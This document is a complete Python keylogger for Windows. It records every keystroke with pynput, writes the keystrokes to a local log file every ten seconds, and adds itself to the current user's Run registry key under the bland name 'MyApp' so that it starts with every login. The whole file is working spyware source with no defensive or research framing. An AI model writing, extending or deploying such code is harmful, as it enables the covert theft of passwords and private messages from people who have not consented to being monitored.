import pynput.keyboard
import threading
import time
from datetime import datetime, timedelta
import winreg as reg
import os

class SimpleKeylogger:
    def __init__(self):
        self.log = ""
        self.lock = threading.Lock()
        self.last_timestamp = datetime.now()
        self.ctrl_pressed = False
    
    def append_to_log(self, key_strike):
        with self.lock:
            current_time = datetime.now()
            if current_time - self.last_timestamp >= timedelta(hours=1):
                timestamp = current_time.strftime('%Y-%m-%d %H:%M:%S')
                self.log += f"\n[{timestamp}] "
                self.last_timestamp = current_time
            self.log += key_strike
    
    def write_log_to_file(self):
        with self.lock:
            if self.log:
                with open("log.txt", "a+", encoding="utf-8") as file:
                    file.write(self.log)
                self.log = ""
    
    def evaluate_keys(self, key):
        try:
            pressed_key = str(key.char)
            if self.ctrl_pressed:
                if pressed_key == 'a':
                    pressed_key = " [CTRL+A] "
                elif pressed_key == 'c':
                    pressed_key = " [CTRL+C] "
                elif pressed_key == 'v':
                    pressed_key = " [CTRL+V] "
                else:
                    self.ctrl_pressed = False
            else:
                self.ctrl_pressed = False  # Reset ctrl flag if a character key is pressed
        except AttributeError:
            special_keys = {
                pynput.keyboard.Key.space: " ",
                pynput.keyboard.Key.enter: "\n",
                pynput.keyboard.Key.tab: "\t",
                pynput.keyboard.Key.backspace: " [BACKSPACE] ",
                pynput.keyboard.Key.delete: " [DELETE] ",
                pynput.keyboard.Key.shift: " [SHIFT] ",
                pynput.keyboard.Key.ctrl_l: " [CTRL_L] ",
                pynput.keyboard.Key.ctrl_r: " [CTRL_R] ",
                pynput.keyboard.Key.alt_l: " [ALT_L] ",
                pynput.keyboard.Key.alt_r: " [ALT_R] ",
                pynput.keyboard.Key.esc: " [ESC] ",
                pynput.keyboard.Key.caps_lock: " [CAPS_LOCK] ",
                pynput.keyboard.Key.cmd: " [CMD] ",
                pynput.keyboard.Key.f1: " [F1] ",
                pynput.keyboard.Key.f2: " [F2] ",
                pynput.keyboard.Key.f3: " [F3] ",
                pynput.keyboard.Key.f4: " [F4] ",
                pynput.keyboard.Key.f5: " [F5] ",
                pynput.keyboard.Key.f6: " [F6] ",
                pynput.keyboard.Key.f7: " [F7] ",
                pynput.keyboard.Key.f8: " [F8] ",
                pynput.keyboard.Key.f9: " [F9] ",
                pynput.keyboard.Key.f10: " [F10] ",
                pynput.keyboard.Key.f11: " [F11] ",
                pynput.keyboard.Key.f12: " [F12] "
            }
            
            pressed_key = special_keys.get(key, f" [{str(key)}] ")

            if key in [pynput.keyboard.Key.ctrl_l, pynput.keyboard.Key.ctrl_r]:
                self.ctrl_pressed = True
            elif key == pynput.keyboard.Key.delete:
                pressed_key = " [DELETE] "
                if self.ctrl_pressed:
                    pressed_key = " [CTRL+DELETE] "
                    self.log = ""  # Clear log if Ctrl + Delete

        self.append_to_log(pressed_key)
    
    def on_release(self, key):
        if key in [pynput.keyboard.Key.ctrl_l, pynput.keyboard.Key.ctrl_r]:
            self.ctrl_pressed = False

    def start(self):
        def on_press(key):
            self.evaluate_keys(key)
        
        def log_writer():
            while True:
                self.write_log_to_file()
                time.sleep(10)  # Write to log file every 10 seconds
        
        keyboard_listener = pynput.keyboard.Listener(on_press=on_press, on_release=self.on_release)
        with keyboard_listener:
            log_writer_thread = threading.Thread(target=log_writer, daemon=True)
            log_writer_thread.start()
            keyboard_listener.join()

# Function to add the script to startup
def add_to_startup(file_path):
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    
    open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open_key, "MyApp", 0, reg.REG_SZ, file_path)
    reg.CloseKey(open_key)

if __name__ == "__main__":
    # Add script to startup
    add_to_startup(os.path.abspath(__file__))

    # Start the keylogger
    SimpleKeylogger().start()
